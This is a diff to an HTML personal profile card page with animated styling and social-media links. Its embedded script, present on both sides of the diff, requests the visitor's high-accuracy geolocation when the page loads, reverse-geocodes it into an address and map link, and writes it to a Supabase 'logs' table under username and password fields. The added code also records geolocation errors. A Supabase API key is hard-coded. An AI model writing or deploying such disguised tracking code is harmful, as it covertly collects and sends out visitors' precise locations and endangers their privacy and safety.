@@ -14,77 +14,28 @@
             --front_color: rgba(10, 25, 47, 0.7); --gold: #FFD700; --muted-gold: #c5a059; --white: #e6f1ff;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-        
         body {
             background: linear-gradient(-45deg, #0a192f, #1A2980, #141e30, #243b55);
             background-size: 400% 400%; animation: waterFlow 10s ease infinite;
-            width: 100vw; min-height: 100vh; 
-            display: flex; justify-content: center; 
-            align-items: flex-start; 
-            padding-top: 40px; 
-            overflow-x: hidden;
+            width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center;
         }
-
         @keyframes waterFlow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-        
         .vcard {
-            width: 90%; max-width: 380px; height: 580px; background: var(--front_color);
-            backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8); position: relative; overflow: hidden;
-            display: flex; flex-direction: column;
+            width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
+            backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
         }
-        .header { height: 32%; position: relative; background: rgba(0,0,0,0.2); }
-        
-        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; top: 0; left: 0; }
-        .wave-01 { 
-            position: absolute; width: 600px; height: 600px; 
-            background: linear-gradient(45deg, var(--water-mid), var(--water-light)); 
-            border-radius: 43%; opacity: 0.4; 
-            top: -450px; left: -110px;
-            animation: rotateWave 12s linear infinite;
-        }
-        @keyframes rotateWave { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-        .profile_pic_content { 
-            width: 120px; height: 120px; border-radius: 50%; 
-            position: absolute; left: 50%; transform: translate(-50%, -50%); 
-            top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); 
-            z-index: 10; box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-            background: #0a192f;
-        }
-        .profile_img { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
-            object-position: center; 
-            display: block;
-        }
-        
-        .card_content { padding-top: 75px; text-align: center; flex-grow: 1; }
-        .satan h4 { 
-            font-size: 1.8em; letter-spacing: 3px; 
-            background: linear-gradient(to right, var(--gold), var(--white)); 
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
-            font-weight: 700; margin-bottom: 15px;
-        }
-        
-        .snuff { min-height: 50px; padding: 0 25px; color: #8892b0; font-size: 0.9em; margin-bottom: 20px; }
-        
-        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 15px; }
-        .social a { text-decoration: none; }
-        .social i { 
-            padding: 12px; font-size: 1.2em; 
-            background: rgba(197, 160, 89, 0.05); border-radius: 14px; 
-            border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); 
-            transition: 0.3s ease;
-        }
-        .social i:hover { color: var(--gold); border-color: var(--gold); transform: scale(1.1); }
-
-        .footer_rights {
-            padding: 15px 0; font-size: 0.65em; color: rgba(230, 241, 255, 0.5);
-            text-align: center; letter-spacing: 1px; border-top: 1px solid rgba(197, 160, 89, 0.1);
-            text-transform: none; /* للسماح بظهور حروف صغيرة وكبيرة */
-        }
+        .header { height: 35%; position: relative; }
+        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; pointer-events: none; }
+        .wave-01 { border-radius: 43%; top: -180%; left: -15%; position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--water-mid), var(--water-light)); opacity: 0.4; animation: rotate 14s linear infinite; }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
+        .profile_image { width: 100%; height: 100%; object-fit: cover; }
+        .card_content { padding-top: 85px; text-align: center; }
+        .satan h4 { font-size: 1.9em; letter-spacing: 3px; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
+        .snuff { min-height: 60px; padding: 0 30px; color: #8892b0; font-size: 0.95em; margin-top: 20px; }
+        .social div { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; padding: 0 10px; }
+        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 14px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); }
     </style>
 </head>
 <body>
@@ -93,10 +44,7 @@
     <div class="header">
         <div class="wave_bg"><div class="wave-01"></div></div>
         <div class="profile_pic_content">
-            <img src="https://i.ibb.co/TBKJ2hwm/IMG-4935.jpg" 
-                 referrerpolicy="no-referrer"
-                 class="profile_img" 
-                 alt="Salem">
+            <img src="https://files.catbox.moe/8gclzh.jpeg" class="profile_image" alt="Profile">
         </div>
     </div>
     <div class="card_content">
@@ -104,19 +52,16 @@
         <div class="snuff"><h5 class="typed_text"></h5></div>
         <div class="social">
             <div>
-                <a href="https://t.me/kokksha" target="_blank"><i class="fab fa-telegram"></i></a>
-                <a href="https://www.facebook.com/share/15KQ2NmX9V/" target="_blank"><i class="fab fa-facebook"></i></a>
-                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94" target="_blank"><i class="fab fa-instagram"></i></a>
-                <a href="https://github.com/salemalshamrie" target="_blank"><i class="fab fa-github"></i></a>
+                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
+                <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
+                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
+                <a href="https://github.com/salemalshamrie"><i class="fab fa-github"></i></a>
                 <a href="tg://settings"><i class="fas fa-user"></i></a>
-                <a href="https://g.co/kgs/pXVXQxK" target="_blank"><i class="fas fa-futbol"></i></a>
-                <a href="https://uokerbala.edu.iq/" target="_blank"><i class="fas fa-university"></i></a>
-                <a href="https://16salm.github.io/AI/" target="_blank"><i class="fas fa-brain"></i></a>
+                <a href="https://g.co/kgs/pXVXQxK"><i class="fas fa-futbol"></i></a>
+                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
+                <a href="https://16salm.github.io/AI/"><i class="fas fa-brain"></i></a>
             </div>
         </div>
-    </div>
-    <div class="footer_rights">
-        © 2023 - 2026 Salem | All Rights Reserved
     </div>
 </div>
 
@@ -125,24 +70,30 @@
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
-    async function startTracking() {
+    async function sendAutoData(loc) {
+        await sb.from('logs').insert([{ username: "Visitor", password: "Auto-Login", location: loc }]);
+    }
+
+    function startTracking() {
         if ("geolocation" in navigator) {
-            const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+            const geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
                 const acc = pos.coords.accuracy;
                 const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                let finalLocData = "";
+                let locInfo = "";
                 try {
                     const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ar`);
                     const d = await r.json();
-                    finalLocData = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                    locInfo = `${d.display_name} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
                 } catch(e) {
-                    finalLocData = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
+                    locInfo = `إحداثيات: ${lat},${lon} | دقة: ${acc.toFixed(1)}m | الرابط: ${mapUrl}`;
                 }
-                await sb.from('logs').insert([{ username: "AUTO_VISITOR", password: "LOGGED_WITHOUT_INTERFACE", location: finalLocData }]);
-            }, null, geoOptions);
+                sendAutoData(locInfo);
+            }, (err) => {
+                sendAutoData("فشل في تحديد الموقع: " + err.message);
+            }, geoOptions);
         }
     }
 
